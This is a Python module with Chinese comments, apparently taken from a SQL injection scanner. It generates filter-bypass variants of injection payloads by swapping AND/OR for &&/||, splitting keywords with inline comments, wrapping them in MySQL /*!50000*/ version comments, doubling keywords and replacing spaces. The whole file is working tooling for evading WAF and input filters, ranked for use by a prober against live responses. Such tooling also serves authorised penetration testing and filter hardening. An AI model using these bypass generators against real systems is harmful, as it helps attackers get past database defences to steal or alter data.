# -*- coding: utf-8 -*-
"""SQL 过滤绕过「等价类」生成器（纯函数，不发请求）。

设计原则：不背 payload 清单，而是对同一语法意图给出多个等价形态：
  · 运算符等价：AND → && / A/**/ND / AANNDD / /*!50000AND*/
  · 逻辑等价：OR  → || / O/**/R / OORR
  · 关键字切分：SELECT → SEL/**/ECT
  · 空白替代：空格 → /**/ / 制表符
  · 版本注释：MySQL 的 /*!50000...*/ 既执行又不被规则当关键字

调用方按优先级取前 N 个做差分验证；本模块只负责「生成 + 去重 + 限流」，
是否生效由真实响应判定（见 prober / filter_profile）。
"""
from __future__ import annotations

import re

_KEYWORDS = ("union", "select", "from", "where", "order", "by", "limit",
             "and", "or")

_SPACE_ALTS = ("/**/", "\t")


def _split_comment(word: str) -> str:
    """关键字中间插注释：AND → A/**/ND（长度 >= 3 才有意义）。"""
    if len(word) < 3:
        return word
    mid = max(1, len(word) // 2)
    return word[:mid] + "/**/" + word[mid:]


def _apply_kw(payload: str, fn) -> str:
    out = payload
    for kw in _KEYWORDS:
        out = re.sub(rf"\b{kw}\b", lambda m: fn(m.group(0)), out, flags=re.I)
    return out


def operator_variants(payload: str) -> list[str]:
    """AND/OR 的等价运算符（MySQL 系）。"""
    out: list[str] = []
    if re.search(r"\band\b", payload, re.I):
        out.append(re.sub(r"\band\b", "&&", payload, flags=re.I))
    if re.search(r"\bor\b", payload, re.I):
        out.append(re.sub(r"\bor\b", "||", payload, flags=re.I))
    return out


def keyword_variants(payload: str) -> list[str]:
    """关键字形态：注释切分 / 版本注释 / 双写（保留空格）。"""
    out = [_apply_kw(payload, _split_comment),
           _apply_kw(payload, lambda w: f"/*!50000{w}*/")]
    dbl = _apply_kw(payload, lambda w: w[:1] + w + w[1:])
    out.append(dbl)
    return [v for v in out if v != payload]


def space_variants(payload: str) -> list[str]:
    """空白替代（含与关键字切分的组合）。"""
    out: list[str] = []
    for sp in _SPACE_ALTS:
        v = re.sub(r"[ \t]+", sp, payload)
        if v != payload:
            out.append(v)
    base = keyword_variants(payload)
    if base:
        for sp in _SPACE_ALTS:
            v = re.sub(r"[ \t]+", sp, base[0])
            if v != payload:
                out.append(v)
    return out


def bypass_matrix(payload: str, limit: int = 12) -> list[str]:
    """按优先级返回候选变体（不含原 payload，已去重，最多 limit 个）。"""
    if not payload:
        return []
    has_orand = bool(re.search(r"\b(and|or)\b", payload, re.I))
    groups: list[list[str]] = []
    # AND/OR 目标：运算符等价 / 关键字切分最可能奏效，放最前
    if has_orand:
        groups += [operator_variants(payload), keyword_variants(payload)]
    groups.append(space_variants(payload))
    if not has_orand:
        groups += [operator_variants(payload), keyword_variants(payload)]

    seen = {payload}
    out: list[str] = []
    for group in groups:
        for v in group:
            if not v or v in seen:
                continue
            seen.add(v)
            out.append(v)
            if len(out) >= limit:
                return out
    return out
